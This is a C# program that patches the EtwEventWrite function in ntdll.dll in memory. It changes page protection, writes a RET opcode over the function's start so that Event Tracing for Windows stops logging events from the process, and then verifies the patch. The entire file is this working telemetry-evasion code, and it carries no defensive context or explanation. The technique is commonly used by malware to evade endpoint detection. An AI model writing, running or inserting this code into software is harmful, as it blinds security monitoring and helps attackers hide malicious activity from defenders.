using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    private delegate int EtwEventWriteDelegate(IntPtr sessionHandle, ref EventDescriptor eventDescriptor, uint userDataCount, IntPtr userData);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    private static bool PatchEtwEventWrite()
    {
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        string ntdllModuleName = "ntdll.dll";
        string etwEventWriteFunctionName = "EtwEventWrite";

        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
        if (ntdllModuleHandle == IntPtr.Zero)
        {
            Console.WriteLine($"Failed to retrieve module handle: {ntdllModuleName}");
            return false;
        }

        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
        if (etwEventWriteAddress == IntPtr.Zero)
        {
            Console.WriteLine($"Failed to retrieve function address: {etwEventWriteFunctionName}");
            return false;
        }

        byte[] retOpcode = { 0xC3 }; // RET opcode
        byte[] originalBytes = new byte[retOpcode.Length];

        if (!VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out _))
        {
            Console.WriteLine("Failed to change memory protection.");
            return false;
        }

        if (!WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out _))
        {
            Console.WriteLine("Failed to write process memory.");
            return false;
        }

        Console.WriteLine("EtwEventWrite patched successfully.");

        return true;
    }

    static bool VerifyEtwEventWritePatch()
    {
        string ntdllModuleName = "ntdll.dll";
        string etwEventWriteFunctionName = "EtwEventWrite";

        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
        if (ntdllModuleHandle == IntPtr.Zero)
        {
            Console.WriteLine($"Failed to retrieve module handle: {ntdllModuleName}");
            return false;
        }

        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
        if (etwEventWriteAddress == IntPtr.Zero)
        {
            Console.WriteLine($"Failed to retrieve function address: {etwEventWriteFunctionName}");
            return false;
        }

        byte[] expectedBytes = { 0xC3 }; // RET opcode
        byte[] actualBytes = new byte[expectedBytes.Length];

        Marshal.Copy(etwEventWriteAddress, actualBytes, 0, expectedBytes.Length);

        bool isPatched = actualBytes.SequenceEqual(expectedBytes);

        Console.WriteLine($"EtwEventWrite patch verification: {(isPatched ? "Patched" : "Not Patched")}");

        return isPatched;
    }

    static void Main(string[] args)
    {
        Console.WriteLine("Patching EtwEventWrite...");

        if (PatchEtwEventWrite())
        {
            Console.WriteLine("Patch applied successfully.");

            Console.WriteLine("Verifying patch...");

            if (VerifyEtwEventWritePatch())
            {
                Console.WriteLine("Patch verified successfully.");
            }
            else
            {
                Console.WriteLine("Patch verification failed.");
            }
        }
        else
        {
            Console.WriteLine("Failed to apply patch.");
        }

        Console.ReadLine();
    }
}
